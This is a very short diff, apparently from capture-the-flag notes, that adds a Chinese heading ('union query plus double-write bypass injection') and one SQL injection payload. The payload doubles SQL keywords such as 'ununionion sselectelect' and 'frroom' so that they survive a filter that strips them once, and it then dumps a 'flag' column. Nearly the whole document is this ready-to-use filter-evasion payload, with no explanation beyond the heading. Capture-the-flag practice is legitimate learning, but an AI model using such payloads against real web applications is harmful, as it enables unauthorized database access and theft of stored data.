@@ -1,0 +1,2 @@
+联合查询+双写绕过注入：
+11" ununionion sselectelect 1,2,grrooup_concat(fflaglag) frroom fflaglag #
